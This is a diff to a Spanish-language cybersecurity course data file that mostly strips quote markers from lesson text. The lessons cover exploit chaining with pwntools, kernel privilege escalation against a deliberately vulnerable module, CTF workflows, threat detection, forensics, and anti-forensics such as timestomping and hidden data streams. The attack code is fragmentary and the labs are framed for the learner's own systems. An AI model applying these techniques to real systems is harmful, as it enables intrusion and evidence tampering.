-    "theory": "Integrar todo lo aprendido en un flujo de desarrollo de exploits moderno: encadenar primitivas (info leak → cálculo de bases → escritura/control de flujo → ROP → shell), automatizar con pwntools, manejar la libc correcta y escribir exploits fiables y reutilizables. Verás cómo se combinan las técnicas para derrotar NX+ASLR+PIE+canary en un objetivo realista de laboratorio. > ⚠️ Ética: solo binarios propios o retos de CTF autorizados.",
+    "theory": "Integrar todo lo aprendido en un flujo de desarrollo de exploits moderno: encadenar primitivas (info leak → cálculo de bases → escritura/control de flujo → ROP → shell), automatizar con pwntools, manejar la libc correcta y escribir exploits fiables y reutilizables. Verás cómo se combinan las técnicas para derrotar NX+ASLR+PIE+canary en un objetivo realista de laboratorio. ⚠️ Ética: solo binarios propios o retos de CTF autorizados.",
     "outcomes": [
       "Diseñar una cadena de explotación por primitivas (leak → base → control).",
       "Automatizar el exploit con pwntools (ELF, ROP, libc, tubes).",
@@ -7068,7 +7068,7 @@ export const CLASSES = [
       "Robustez: manejo de badchars, alineación, timing y reintentos. Clave: un exploit que solo"
     ],
     "tools": [],
-    "lab": "> Entorno propio. 1. Reconocimiento del objetivo (binario de reto con NX+PIE+ASLR, sin canary o con canary a filtrar): ``bash checksec ./target ` 2. Estructura el exploit en pwntools con una plantilla reutilizable: `python from pwn import * exe = context.binary = ELF(\"./target\") libc = ELF(\"./libc.so.6\") def conn(): return remote(args.HOST, int(args.PORT)) if args.REMOTE else process(exe.path) io…",
+    "lab": "Entorno propio. 1. Reconocimiento del objetivo (binario de reto con NX+PIE+ASLR, sin canary o con canary a filtrar): ``bash checksec ./target ` 2. Estructura el exploit en pwntools con una plantilla reutilizable: `python from pwn import * exe = context.binary = ELF(\"./target\") libc = ELF(\"./libc.so.6\") def conn(): return remote(args.HOST, int(args.PORT)) if args.REMOTE else process(exe.path) io =…",
     "exercises": [
       "Escribe una plantilla pwntools que alterne local/remoto con args.REMOTE.",
       "Identifica una libc desconocida a partir de un leak con libc-database.",
@@ -7089,7 +7089,7 @@ export const CLASSES = [
     "level": "Experto",
     "duration": "150 min",
     "description": "Dar el salto de user-space a kernel-space: entender por qué explotar el kernel implica escalada de privilegios total, qué superficie ofrecen los drivers y syscalls, y cómo se aplican las técnicas de corrupción de memori…",
-    "theory": "Dar el salto de user-space a kernel-space: entender por qué explotar el kernel implica escalada de privilegios total, qué superficie ofrecen los drivers y syscalls, y cómo se aplican las técnicas de corrupción de memoria en un contexto con sus propias mitigaciones (SMEP, SMAP, KASLR, KPTI). Practicarás en un módulo vulnerable propio dentro de una VM, con el objetivo clásico de commit_creds(prepare_kernel_cred(0)). > ⚠️ Ética: exclusivamente en tu VM de laboratorio con un módulo que tú compilas. Un exploit de > kernel puede colgar o corromper el sistema; usa snapshots. Nunca contra sistemas aj…",
+    "theory": "Dar el salto de user-space a kernel-space: entender por qué explotar el kernel implica escalada de privilegios total, qué superficie ofrecen los drivers y syscalls, y cómo se aplican las técnicas de corrupción de memoria en un contexto con sus propias mitigaciones (SMEP, SMAP, KASLR, KPTI). Practicarás en un módulo vulnerable propio dentro de una VM, con el objetivo clásico de commit_creds(prepare_kernel_cred(0)). ⚠️ Ética: exclusivamente en tu VM de laboratorio con un módulo que tú compilas. Un exploit de kernel puede colgar o corromper el sistema; usa snapshots. Nunca contra sistemas ajenos.",
     "outcomes": [
       "Explicar la separación user/kernel y por qué el impacto es máximo.",
       "Identificar superficie de ataque: syscalls, drivers/ioctl, /proc, netlink.",
@@ -7116,7 +7116,7 @@ export const CLASSES = [
       "commit_creds/prepare_kernel_cred: funciones del kernel que, encadenadas, otorgan credenciales de"
     ],
     "tools": [],
-    "lab": "> Entorno propio: VM/QEMU con módulo vulnerable que tú compilas. 1. Compila un módulo de práctica con un copy_from_user sin acotar (bug deliberado) que exponga un ioctl/write vulnerable. Cárgalo con insmod en la VM. 2. Arranca la VM en QEMU con parámetros conocidos para controlar las mitigaciones (para el primer ejercicio puedes desactivar KASLR con nokaslr y observar direcciones estables): ``bas…",
+    "lab": "Entorno propio: VM/QEMU con módulo vulnerable que tú compilas. 1. Compila un módulo de práctica con un copy_from_user sin acotar (bug deliberado) que exponga un ioctl/write vulnerable. Cárgalo con insmod en la VM. 2. Arranca la VM en QEMU con parámetros conocidos para controlar las mitigaciones (para el primer ejercicio puedes desactivar KASLR con nokaslr y observar direcciones estables): ``bash…",
     "exercises": [
       "Enumera cuatro fuentes de superficie de ataque de un kernel Linux.",
       "Explica por qué SMEP rompe el ret2usr y cómo se evade con kernel ROP.",
@@ -7137,7 +7137,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "130 min",
     "description": "Consolidar toda la parte practicando en CTFs de categoría pwn y reversing: entender el formato de las competencias, montar un flujo de trabajo eficiente (triage → hipótesis → primitiva → exploit → flag), gestionar objet…",
-    "theory": "Consolidar toda la parte practicando en CTFs de categoría pwn y reversing: entender el formato de las competencias, montar un flujo de trabajo eficiente (triage → hipótesis → primitiva → exploit → flag), gestionar objetivos remotos, y aprender de los writeups. El CTF es el gimnasio donde se afilan las técnicas de explotación e ingeniería inversa de forma legal y motivadora. > ⚠️ Ética: los retos de CTF son entornos autorizados por diseño. No traslades estas técnicas a > sistemas de terceros fuera del CTF.",
+    "theory": "Consolidar toda la parte practicando en CTFs de categoría pwn y reversing: entender el formato de las competencias, montar un flujo de trabajo eficiente (triage → hipótesis → primitiva → exploit → flag), gestionar objetivos remotos, y aprender de los writeups. El CTF es el gimnasio donde se afilan las técnicas de explotación e ingeniería inversa de forma legal y motivadora. ⚠️ Ética: los retos de CTF son entornos autorizados por diseño. No traslades estas técnicas a sistemas de terceros fuera del CTF.",
     "outcomes": [
       "Organizar un flujo de trabajo de CTF (categorías, triage, priorización).",
       "Resolver retos de pwn conectando a un servicio remoto con pwntools.",
@@ -7164,7 +7164,7 @@ export const CLASSES = [
       "Writeup: solución documentada de un reto. Clave: la mejor fuente de aprendizaje tras intentarlo."
     ],
     "tools": [],
-    "lab": "> Entorno autorizado: retos de CTF/plataformas de práctica. 1. Triage de un reto de pwn descargado: ``bash file chall && checksec ./chall && strings chall | head # abre en Ghidra para localizar la función vulnerable ` 2. Reproduce el bug localmente y determina la primitiva (overflow, fmt, UAF…). 3. Usa una plantilla pwntools que sirva local y remoto: `python from pwn import * exe = context.binary…",
+    "lab": "Entorno autorizado: retos de CTF/plataformas de práctica. 1. Triage de un reto de pwn descargado: ``bash file chall && checksec ./chall && strings chall | head # abre en Ghidra para localizar la función vulnerable ` 2. Reproduce el bug localmente y determina la primitiva (overflow, fmt, UAF…). 3. Usa una plantilla pwntools que sirva local y remoto: `python from pwn import * exe = context.binary =…",
     "exercises": [
       "Resuelve un reto de picoCTF de la categoría Binary Exploitation y documenta el flujo.",
       "Resuelve un crackme de crackmes.one y publica (para ti) el razonamiento.",
@@ -9848,7 +9848,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Detectar cómo un atacante se desplaza de un host comprometido a otros dentro de la red: PsExec/servicios remotos, WMI, WinRM, RDP, Pass-the-Hash y abuso de credenciales.",
-    "theory": "Detectar cómo un atacante se desplaza de un host comprometido a otros dentro de la red: PsExec/servicios remotos, WMI, WinRM, RDP, Pass-the-Hash y abuso de credenciales. Aprenderás qué huellas dejan estas técnicas en Event Logs, Sysmon y telemetría de red, y cómo distinguirlas de la administración legítima. > ⚠️ Ética: las técnicas ofensivas descritas se ejecutan únicamente para generar telemetría de detección en tu laboratorio propio y aislado, o con autorización explícita. El objetivo de la clase es defensivo.",
+    "theory": "Detectar cómo un atacante se desplaza de un host comprometido a otros dentro de la red: PsExec/servicios remotos, WMI, WinRM, RDP, Pass-the-Hash y abuso de credenciales. Aprenderás qué huellas dejan estas técnicas en Event Logs, Sysmon y telemetría de red, y cómo distinguirlas de la administración legítima. ⚠️ Ética: las técnicas ofensivas descritas se ejecutan únicamente para generar telemetría de detección en tu laboratorio propio y aislado, o con autorización explícita. El objetivo de la clase es defensivo.",
     "outcomes": [
       "Enumerar las técnicas de movimiento lateral más comunes y sus artefactos.",
       "Detectar ejecución remota (PsExec, WMI, WinRM) en logs de Windows.",
@@ -9902,7 +9902,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "120 min",
     "description": "Detectar canales de mando y control (C2) y su patrón de beaconing: las llamadas periódicas que un implante hace a su servidor.",
-    "theory": "Detectar canales de mando y control (C2) y su patrón de beaconing: las llamadas periódicas que un implante hace a su servidor. Aprenderás a reconocer regularidad temporal, jitter, dominios y fingerprints de frameworks como Cobalt Strike, y a cazar C2 sobre HTTP/S, DNS y protocolos comunes usando telemetría de red y endpoint. > ⚠️ Ética: cualquier despliegue de C2 (p. ej. un teamserver de laboratorio) para generar telemetría se hace exclusivamente en tu entorno propio y aislado. El fin es construir detección defensiva.",
+    "theory": "Detectar canales de mando y control (C2) y su patrón de beaconing: las llamadas periódicas que un implante hace a su servidor. Aprenderás a reconocer regularidad temporal, jitter, dominios y fingerprints de frameworks como Cobalt Strike, y a cazar C2 sobre HTTP/S, DNS y protocolos comunes usando telemetría de red y endpoint. ⚠️ Ética: cualquier despliegue de C2 (p. ej. un teamserver de laboratorio) para generar telemetría se hace exclusivamente en tu entorno propio y aislado. El fin es construir detección defensiva.",
     "outcomes": [
       "Explicar cómo funciona un canal C2 y qué es el beaconing (intervalo + jitter).",
       "Detectar periodicidad de conexiones con análisis estadístico.",
@@ -9956,7 +9956,7 @@ export const CLASSES = [
     "level": "Intermedio",
     "duration": "100 min",
     "description": "Usar el engaño (deception) como fuente de detección de altísima fidelidad: honeypots, honeytokens y cuentas trampa que nadie legítimo debería tocar, de modo que cualquier interacción es, por definición, sospechosa.",
-    "theory": "Usar el engaño (deception) como fuente de detección de altísima fidelidad: honeypots, honeytokens y cuentas trampa que nadie legítimo debería tocar, de modo que cualquier interacción es, por definición, sospechosa. Aprenderás a desplegar señuelos, a colocar honeytokens en lugares estratégicos y a alertar sobre su uso. > ⚠️ Ética: los honeypots se despliegan en tu propia infraestructura para observar y alertar. No los uses para atacar a terceros ni para atraer tráfico hacia sistemas que no controlas.",
+    "theory": "Usar el engaño (deception) como fuente de detección de altísima fidelidad: honeypots, honeytokens y cuentas trampa que nadie legítimo debería tocar, de modo que cualquier interacción es, por definición, sospechosa. Aprenderás a desplegar señuelos, a colocar honeytokens en lugares estratégicos y a alertar sobre su uso. ⚠️ Ética: los honeypots se despliegan en tu propia infraestructura para observar y alertar. No los uses para atacar a terceros ni para atraer tráfico hacia sistemas que no controlas.",
     "outcomes": [
       "Diferenciar honeypots de baja y alta interacción, honeytokens y honeynets.",
       "Desplegar un honeypot de laboratorio y recolectar sus eventos.",
@@ -10280,7 +10280,7 @@ export const CLASSES = [
     "level": "Experto",
     "duration": "120 min",
     "description": "Cerrar la parte uniendo ataque y defensa: el purple team es la colaboración deliberada entre red y blue para validar y mejorar la detección de forma iterativa.",
-    "theory": "Cerrar la parte uniendo ataque y defensa: el purple team es la colaboración deliberada entre red y blue para validar y mejorar la detección de forma iterativa. Desde el lado defensivo, aprenderás a diseñar ejercicios de emulación de adversario, a ejecutar técnicas de forma controlada (Atomic Red Team, Caldera), a medir qué detectas y a cerrar cada hueco con una detección nueva. > ⚠️ Ética: toda emulación de adversario se realiza en tu laboratorio propio y aislado o con autorización explícita y por escrito. El propósito es medir y mejorar la detección, nunca causar daño ni operar fuera del alc…",
+    "theory": "Cerrar la parte uniendo ataque y defensa: el purple team es la colaboración deliberada entre red y blue para validar y mejorar la detección de forma iterativa. Desde el lado defensivo, aprenderás a diseñar ejercicios de emulación de adversario, a ejecutar técnicas de forma controlada (Atomic Red Team, Caldera), a medir qué detectas y a cerrar cada hueco con una detección nueva. ⚠️ Ética: toda emulación de adversario se realiza en tu laboratorio propio y aislado o con autorización explícita y por escrito. El propósito es medir y mejorar la detección, nunca causar daño ni operar fuera del alcan…",
     "outcomes": [
       "Explicar el propósito y el flujo de un ejercicio purple team.",
       "Planificar una emulación de adversario basada en ATT&CK e intel.",
@@ -10367,7 +10367,7 @@ export const CLASSES = [
       "Herramientas: sha256sum, md5sum, hashdeep, un editor de texto para el formulario de custodia, y una plantilla de cadena de custodia (puedes usar la de NIST o SANS).",
       "Material físico simulado: bolsas antiestáticas con etiqueta, marcador indeleble, cuaderno de notas foliado."
     ],
-    "lab": "> Ejercicio conceptual y práctico con archivos propios. No requiere evidencia real de terceros. 1. Crea un archivo que simule evidencia adquirida: ``bash dd if=/dev/urandom of=evidencia.img bs=1M count=50 ` 2. Calcula y guarda su hash de integridad al momento de la \"adquisición\": `bash sha256sum evidencia.img | tee evidencia.sha256 ` 3. Redacta el formulario de cadena de custodia con estos campos…",
+    "lab": "Ejercicio conceptual y práctico con archivos propios. No requiere evidencia real de terceros. 1. Crea un archivo que simule evidencia adquirida: ``bash dd if=/dev/urandom of=evidencia.img bs=1M count=50 ` 2. Calcula y guarda su hash de integridad al momento de la \"adquisición\": `bash sha256sum evidencia.img | tee evidencia.sha256 ` 3. Redacta el formulario de cadena de custodia con estos campos m…",
     "exercises": [
       "Enumera, en orden de volatilidad, siete fuentes de evidencia de un portátil encendido.",
       "Redacta una plantilla de cadena de custodia con al menos diez campos.",
@@ -10420,7 +10420,7 @@ export const CLASSES = [
       "Plantillas: una matriz de severidad (P1–P4), una plantilla de runbook y una lista de contactos de escalado.",
       "Software de apoyo: un sistema de tickets (TheHive es ideal y gratuito) para registrar el ciclo de vida del incidente."
     ],
-    "lab": "> Ejercicio aplicado de proceso. No requiere entorno ofensivo. 1. Define una matriz de severidad con cuatro niveles. Para cada uno especifica: impacto, tiempo de respuesta objetivo y quién debe ser notificado. 2. Toma este escenario: \"El EDR reporta que un servidor de nóminas ejecutó PowerShell ofuscado que contactó una IP externa a las 03:14 UTC\". Clasifícalo y justifica la severidad. 3. Recorre…",
+    "lab": "Ejercicio aplicado de proceso. No requiere entorno ofensivo. 1. Define una matriz de severidad con cuatro niveles. Para cada uno especifica: impacto, tiempo de respuesta objetivo y quién debe ser notificado. 2. Toma este escenario: \"El EDR reporta que un servidor de nóminas ejecutó PowerShell ofuscado que contactó una IP externa a las 03:14 UTC\". Clasifícalo y justifica la severidad. 3. Recorre l…",
     "exercises": [
       "Dibuja el ciclo NIST como diagrama y marca dónde es iterativo.",
       "Crea una tabla que mapee cada paso PICERL con su fase NIST equivalente.",
@@ -10474,7 +10474,7 @@ export const CLASSES = [
       "Hardware simulado: usa un pendrive propio o un archivo .img como \"disco\". Nunca practiques sobre medios de terceros sin autorización.",
       "Recuerda: laboratorio aislado, evidencia propia, y bloqueo de escritura siempre que toques un original."
     ],
-    "lab": "> Usa un pendrive PROPIO o un archivo imagen que tú creas. Nunca medios ajenos sin permiso escrito. 1. Identifica el dispositivo (en Linux) sin montarlo: ``bash lsblk -o NAME,SIZE,TYPE,MOUNTPOINT ` 2. Monta el original en solo lectura si necesitas inspeccionarlo (simula write-blocker por software): `bash blockdev --setro /dev/sdX ` 3. Adquiere con dcfldd calculando hash al vuelo: `bash dcfldd if=…",
+    "lab": "Usa un pendrive PROPIO o un archivo imagen que tú creas. Nunca medios ajenos sin permiso escrito. 1. Identifica el dispositivo (en Linux) sin montarlo: ``bash lsblk -o NAME,SIZE,TYPE,MOUNTPOINT ` 2. Monta el original en solo lectura si necesitas inspeccionarlo (simula write-blocker por software): `bash blockdev --setro /dev/sdX ` 3. Adquiere con dcfldd calculando hash al vuelo: `bash dcfldd if=/d…",
     "exercises": [
       "Explica cuándo elegirías adquisición lógica en vez de física.",
       "Compara RAW y E01 en una tabla de ventajas/desventajas.",
@@ -10528,7 +10528,7 @@ export const CLASSES = [
       "ext4: debugfs, extundelete.",
       "Entorno: monta las imágenes en solo lectura. Trabaja sobre imágenes propias creadas en la clase anterior."
     ],
-    "lab": "> Usa una imagen .dd propia (por ejemplo de un pendrive formateado en NTFS y otro en ext4). 1. Examina la tabla de particiones: ``bash mmls caso001.dd ` 2. Muestra estadísticas del sistema de archivos: `bash fsstat -o 2048 caso001.dd ` 3. Lista archivos incluyendo borrados (marcados con ): `bash fls -r -o 2048 caso001.dd ` 4. Inspecciona un inodo/registro MFT concreto: `bash istat -o 2048 caso001…",
+    "lab": "Usa una imagen .dd propia (por ejemplo de un pendrive formateado en NTFS y otro en ext4). 1. Examina la tabla de particiones: ``bash mmls caso001.dd ` 2. Muestra estadísticas del sistema de archivos: `bash fsstat -o 2048 caso001.dd ` 3. Lista archivos incluyendo borrados (marcados con ): `bash fls -r -o 2048 caso001.dd ` 4. Inspecciona un inodo/registro MFT concreto: `bash istat -o 2048 caso001.d…",
     "exercises": [
       "Explica la diferencia entre timestamps residentes y no residentes en la MFT.",
       "Detecta timestomping comparando $SI y $FN en una MFT de ejemplo.",
@@ -10582,7 +10582,7 @@ export const CLASSES = [
       "Extracción: FTK Imager o KAPE para volcar los artefactos de una imagen montada en solo lectura.",
       "Entorno: usa una imagen de una VM Windows PROPIA donde tú generaste la actividad."
     ],
-    "lab": "> Genera la actividad tú mismo en una VM Windows propia, luego analiza sus artefactos. 1. Con KAPE o FTK Imager, extrae de la imagen: C:\\Windows\\Prefetch, hives SYSTEM/SOFTWARE/NTUSER.DAT, Amcache.hve y C:\\Windows\\System32\\winevt\\Logs. 2. Analiza Prefetch: ``bash PECmd.exe -d Prefetch --csv salida --csvf prefetch.csv ` 3. Parsea ShimCache: `bash AppCompatCacheParser.exe -f SYSTEM --csv salida ` 4…",
+    "lab": "Genera la actividad tú mismo en una VM Windows propia, luego analiza sus artefactos. 1. Con KAPE o FTK Imager, extrae de la imagen: C:\\Windows\\Prefetch, hives SYSTEM/SOFTWARE/NTUSER.DAT, Amcache.hve y C:\\Windows\\System32\\winevt\\Logs. 2. Analiza Prefetch: ``bash PECmd.exe -d Prefetch --csv salida --csvf prefetch.csv ` 3. Parsea ShimCache: `bash AppCompatCacheParser.exe -f SYSTEM --csv salida ` 4.…",
     "exercises": [
       "Explica qué prueba (y qué no) un archivo Prefetch.",
       "Diferencia ShimCache de AmCache y di cuándo usar cada uno.",
@@ -10635,7 +10635,7 @@ export const CLASSES = [
       "Análisis: The Sleuth Kit para montar la imagen, log2timeline/plaso para timeline.",
       "Entorno: usa una imagen de una VM Linux propia. Monta en solo lectura:"
     ],
-    "lab": "> Trabaja sobre una imagen de una VM Linux propia montada en solo lectura. 1. Revisa autenticación (SSH, sudo): ``bash grep -Ei \"accepted|failed|sudo\" /mnt/evidencia/var/log/auth.log ` 2. Lee logins con los registros binarios: `bash last -f /mnt/evidencia/var/log/wtmp lastb -f /mnt/evidencia/var/log/btmp ` 3. Consulta journald offline: `bash journalctl --directory=/mnt/evidencia/var/log/journal -…",
+    "lab": "Trabaja sobre una imagen de una VM Linux propia montada en solo lectura. 1. Revisa autenticación (SSH, sudo): ``bash grep -Ei \"accepted|failed|sudo\" /mnt/evidencia/var/log/auth.log ` 2. Lee logins con los registros binarios: `bash last -f /mnt/evidencia/var/log/wtmp lastb -f /mnt/evidencia/var/log/btmp ` 3. Consulta journald offline: `bash journalctl --directory=/mnt/evidencia/var/log/journal --n…",
     "exercises": [
       "Extrae de auth.log todos los logins SSH exitosos y su IP de origen.",
       "Detecta un ataque de fuerza bruta contando fallos en btmp.",
@@ -10688,7 +10688,7 @@ export const CLASSES = [
       "Análisis: Volatility 3 (Python 3). Instala con pip install volatility3.",
       "Muestras: usa un volcado de una VM propia o los volcados de práctica públicos (por ejemplo, imágenes de entrenamiento de Volatility). Nunca ejecutes malware fuera de un laboratorio aislado y desechable."
     ],
-    "lab": "> Adquiere memoria de una VM propia o usa una muestra de entrenamiento pública. 1. Adquiere la memoria (Windows, WinPmem): ``powershell winpmem_mini.exe memoria.raw ` En Linux con AVML: `bash ./avml memoria.lime ` 2. Lista procesos: `bash vol -f memoria.raw windows.pslist ` 3. Busca procesos ocultos comparando con psscan: `bash vol -f memoria.raw windows.psscan ` Cualquier PID en psscan que no es…",
+    "lab": "Adquiere memoria de una VM propia o usa una muestra de entrenamiento pública. 1. Adquiere la memoria (Windows, WinPmem): ``powershell winpmem_mini.exe memoria.raw ` En Linux con AVML: `bash ./avml memoria.lime ` 2. Lista procesos: `bash vol -f memoria.raw windows.pslist ` 3. Busca procesos ocultos comparando con psscan: `bash vol -f memoria.raw windows.psscan ` Cualquier PID en psscan que no esté…",
     "exercises": [
       "Explica por qué se adquiere RAM antes que disco.",
       "Detecta un proceso oculto comparando pslist y psscan.",
@@ -10741,7 +10741,7 @@ export const CLASSES = [
       "Análisis: Wireshark y tshark, Zeek, NetworkMiner (extracción de archivos), RITA (detección de beaconing sobre logs de Zeek).",
       "Muestras: usa PCAPs propios o datasets públicos de práctica (por ejemplo, capturas de Malware-Traffic-Analysis con fines educativos). Analiza malware solo en laboratorio aislado."
     ],
-    "lab": "> Usa un PCAP propio o una muestra pública de entrenamiento. 1. Estadística rápida del PCAP con tshark: ``bash tshark -r captura.pcap -q -z conv,tcp ` 2. Filtra tráfico HTTP y extrae hosts contactados: `bash tshark -r captura.pcap -Y \"http.request\" -T fields -e http.host -e http.request.uri ` 3. En Wireshark, usa Follow → TCP Stream sobre una sesión sospechosa para ver la conversación completa. 4…",
+    "lab": "Usa un PCAP propio o una muestra pública de entrenamiento. 1. Estadística rápida del PCAP con tshark: ``bash tshark -r captura.pcap -q -z conv,tcp ` 2. Filtra tráfico HTTP y extrae hosts contactados: `bash tshark -r captura.pcap -Y \"http.request\" -T fields -e http.host -e http.request.uri ` 3. En Wireshark, usa Follow → TCP Stream sobre una sesión sospechosa para ver la conversación completa. 4.…",
     "exercises": [
       "Filtra en Wireshark solo el tráfico de una IP y un puerto concretos.",
       "Extrae un archivo transferido por HTTP de un PCAP.",
@@ -10795,7 +10795,7 @@ export const CLASSES = [
       "Entrada: una imagen .dd/.E01 propia de las clases anteriores.",
       "Recuerda: trabaja sobre copias, nunca el original."
     ],
-    "lab": "> Usa una imagen forense propia de una VM que investigaste. 1. Genera el storage de plaso desde la imagen: ``bash log2timeline.py --storage-file caso.plaso imagen.E01 ` 2. Revisa qué se recolectó: `bash pinfo.py caso.plaso ` 3. Exporta una super-timeline completa a CSV: `bash psort.py -o l2tcsv -w timeline.csv caso.plaso ` 4. Acota a la ventana del incidente (por ejemplo, un día): `bash psort.py…",
+    "lab": "Usa una imagen forense propia de una VM que investigaste. 1. Genera el storage de plaso desde la imagen: ``bash log2timeline.py --storage-file caso.plaso imagen.E01 ` 2. Revisa qué se recolectó: `bash pinfo.py caso.plaso ` 3. Exporta una super-timeline completa a CSV: `bash psort.py -o l2tcsv -w timeline.csv caso.plaso ` 4. Acota a la ventana del incidente (por ejemplo, un día): `bash psort.py -o…",
     "exercises": [
       "Genera una super-timeline y cuenta cuántas fuentes agregó plaso.",
       "Filtra la timeline a una ventana de dos horas.",
@@ -10848,7 +10848,7 @@ export const CLASSES = [
       "Correo: libpff (PST), readpst, un visor de EML, y análisis manual de encabezados.",
       "Entorno: usa perfiles de navegador y correos PROPIOS. Si analizas un correo de phishing real recibido por ti, hazlo en entorno aislado y no abras los adjuntos."
     ],
-    "lab": "> Usa tu propio perfil de navegador y correos propios. 1. Copia (no abras el navegador en vivo) la base de historial de Chrome: - Windows: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History. 2. Explora el historial con SQL: ``sql SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC; ` 3. Convierte los timestamps WebKit a fecha legible (recuerda: microsegundo…",
+    "lab": "Usa tu propio perfil de navegador y correos propios. 1. Copia (no abras el navegador en vivo) la base de historial de Chrome: - Windows: %LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\History. 2. Explora el historial con SQL: ``sql SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC; ` 3. Convierte los timestamps WebKit a fecha legible (recuerda: microsegundos…",
     "exercises": [
       "Convierte tres timestamps WebKit a fecha UTC legible.",
       "Lista las diez URLs más visitadas de tu perfil.",
@@ -10902,7 +10902,7 @@ export const CLASSES = [
       "Comerciales (referencia): Cellebrite UFED, Magnet AXIOM, Oxygen Forensic (no libres; se mencionan por su rol en la industria).",
       "Entorno: usa un dispositivo o emulador PROPIO. La extracción de un móvil ajeno requiere consentimiento u orden judicial; respétalo siempre."
     ],
-    "lab": "> Usa un dispositivo Android propio (o un emulador) con datos de prueba que tú generas. 1. Habilita depuración USB en el dispositivo propio y conecta ADB: ``bash adb devices ` 2. Realiza una extracción lógica por backup: `bash adb backup -all -f backup.ab ` 3. Convierte el backup a un tar analizable (con abe.jar o android-backup-extractor). 4. Extrae info del dispositivo: `bash adb shell getprop…",
+    "lab": "Usa un dispositivo Android propio (o un emulador) con datos de prueba que tú generas. 1. Habilita depuración USB en el dispositivo propio y conecta ADB: ``bash adb devices ` 2. Realiza una extracción lógica por backup: `bash adb backup -all -f backup.ab ` 3. Convierte el backup a un tar analizable (con abe.jar o android-backup-extractor). 4. Extrae info del dispositivo: `bash adb shell getprop ro…",
     "exercises": [
       "Explica las diferencias entre extracción lógica, de FS y física.",
       "Describe por qué BFU limita más la extracción que AFU.",
@@ -10956,7 +10956,7 @@ export const CLASSES = [
       "GCP: Cloud Logging, gcloud logging read.",
       "Entorno: usa una cuenta/proyecto PROPIO (nivel gratuito). Nunca investigues cuentas ajenas sin autorización."
     ],
-    "lab": "> Usa tu propia cuenta de nube en nivel gratuito. Simula el \"incidente\" tú mismo. 1. Genera actividad de prueba y consúltala en CloudTrail (AWS): ``bash aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=RunInstances ` 2. Busca acciones sospechosas por identidad: `bash aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=usuario…",
+    "lab": "Usa tu propia cuenta de nube en nivel gratuito. Simula el \"incidente\" tú mismo. 1. Genera actividad de prueba y consúltala en CloudTrail (AWS): ``bash aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=RunInstances ` 2. Busca acciones sospechosas por identidad: `bash aws cloudtrail lookup-events --lookup-attributes AttributeKey=Username,AttributeValue=usuario-p…",
     "exercises": [
       "Explica qué evidencia NO puedes obtener por la responsabilidad compartida.",
       "Consulta en CloudTrail las últimas 24 h de acciones de una identidad.",
@@ -10977,7 +10977,7 @@ export const CLASSES = [
     "level": "Avanzado",
     "duration": "110 min",
     "description": "Conocer las técnicas que los atacantes usan para borrar sus huellas y engañar al analista —borrado seguro, timestomping, cifrado, ocultamiento, log tampering, esteganografía— y, sobre todo, aprender a detectarlas y cont…",
-    "theory": "Conocer las técnicas que los atacantes usan para borrar sus huellas y engañar al analista —borrado seguro, timestomping, cifrado, ocultamiento, log tampering, esteganografía— y, sobre todo, aprender a detectarlas y contrarrestarlas. Al terminar sabrás reconocer cuándo alguien intentó destruir o falsear evidencia. > ⚠️ Nota ética: estas técnicas se estudian para defender y detectar. Practícalas solo en tus propios sistemas de laboratorio. Usar anti-forense para obstruir una investigación real es ilegal.",
+    "theory": "Conocer las técnicas que los atacantes usan para borrar sus huellas y engañar al analista —borrado seguro, timestomping, cifrado, ocultamiento, log tampering, esteganografía— y, sobre todo, aprender a detectarlas y contrarrestarlas. Al terminar sabrás reconocer cuándo alguien intentó destruir o falsear evidencia. ⚠️ Nota ética: estas técnicas se estudian para defender y detectar. Practícalas solo en tus propios sistemas de laboratorio. Usar anti-forense para obstruir una investigación real es ilegal.",
     "outcomes": [
       "Clasificar las principales familias de técnicas anti-forense.",
       "Detectar timestomping y manipulación de metadatos.",
@@ -11009,7 +11009,7 @@ export const CLASSES = [
       "Análisis de wiping: inspección de patrones en espacio no asignado.",
       "Entorno: laboratorio propio. Genera tú las técnicas y luego detéctalas."
     ],
-    "lab": "> Todo sobre tus propios sistemas de laboratorio. 1. Timestomping y su detección: cambia el mtime de un archivo propio y detéctalo comparando $SI vs $FN en la MFT: ``bash MFTECmd.exe -f \"$MFT\" --csv salida --csvf mft.csv ` Busca registros donde los tiempos de $SI sean anteriores a los de $FN (imposible en uso normal). 2. Alternate Data Streams: crea y detecta un ADS en NTFS: `cmd echo secreto > a…",
+    "lab": "Todo sobre tus propios sistemas de laboratorio. 1. Timestomping y su detección: cambia el mtime de un archivo propio y detéctalo comparando $SI vs $FN en la MFT: ``bash MFTECmd.exe -f \"$MFT\" --csv salida --csvf mft.csv ` Busca registros donde los tiempos de $SI sean anteriores a los de $FN (imposible en uso normal). 2. Alternate Data Streams: crea y detecta un ADS en NTFS: `cmd echo secreto > arc…",
     "exercises": [
       "Detecta timestomping por incoherencia $SI/$FN.",
       "Crea y encuentra un ADS en NTFS.",
@@ -11063,7 +11063,7 @@ export const CLASSES = [
       "Metadatos: The Sleuth Kit (icat, fls -d), extundelete (ext4), testdisk (particiones).",
       "Entrada: una imagen .dd propia donde borraste archivos a propósito."
     ],
-    "lab": "> Usa una imagen propia donde tú borraste archivos conocidos (para verificar la recuperación). 1. Primero intenta recuperación por metadatos con TSK: ``bash fls -d -r -o 2048 imagen.dd # lista borrados icat -o 2048 imagen.dd 512 > recuperado_meta.bin ` 2. Si no hay metadatos, aplica carving con foremost: `bash foremost -t jpg,pdf,doc,zip -i imagen.dd -o salida_foremost ` 3. Prueba PhotoRec (inter…",
+    "lab": "Usa una imagen propia donde tú borraste archivos conocidos (para verificar la recuperación). 1. Primero intenta recuperación por metadatos con TSK: ``bash fls -d -r -o 2048 imagen.dd # lista borrados icat -o 2048 imagen.dd 512 > recuperado_meta.bin ` 2. Si no hay metadatos, aplica carving con foremost: `bash foremost -t jpg,pdf,doc,zip -i imagen.dd -o salida_foremost ` 3. Prueba PhotoRec (interac…",
     "exercises": [
       "Explica cuándo prefieres metadatos y cuándo carving.",
       "Identifica las firmas de JPEG, PDF y ZIP en un editor hex.",
